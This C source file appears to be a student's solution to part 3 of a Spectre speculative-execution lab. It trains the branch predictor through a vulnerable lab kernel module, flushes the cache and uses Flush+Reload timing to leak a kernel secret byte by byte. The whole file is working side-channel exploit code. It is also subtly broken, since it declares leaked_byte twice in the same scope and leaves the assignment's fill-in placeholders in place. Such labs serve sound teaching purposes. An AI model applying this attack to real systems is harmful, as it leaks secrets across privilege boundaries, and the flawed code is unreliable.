/*
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 3]- Fill this in!
        // leaked_byte = ??
        const uint64_t CACHE_HIT_THRESHOLD = 80;
        int counts[256] = {0};
        const int max_attempts = 100;

        for (int attempt = 0; attempt < max_attempts; attempt++) {
            // Step 1: Train branch predictor
            for (int train = 0; train < 40; train++) {
                call_kernel_part3(kernel_fd, shared_memory, 0);
            }

            // Step 2: Flush memory to extend speculation window
            clflush(&shared_memory[0]);

            // Step 3: Flush shared memory pages
            for (int i = 0; i < 256; i++) {
                clflush(&shared_memory[i * 4096]);
            }

            // Step 4: Trigger speculative execution
            call_kernel_part3(kernel_fd, shared_memory, current_offset);

            // Step 5: Measure cache hit times
            for (int i = 0; i < 256; i++) {
                uint64_t time = time_access(&shared_memory[i * 4096]);
                if (time < CACHE_HIT_THRESHOLD) {
                    counts[i]++;
                }
            }
        }

        // Find most frequent result
        int best_guess = -1;
        int best_count = 0;
        for (int i = 0; i < 256; i++) {
            if (counts[i] > best_count) {
                best_count = counts[i];
                best_guess = i;
            }
        }

        char leaked_byte = best_guess;

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
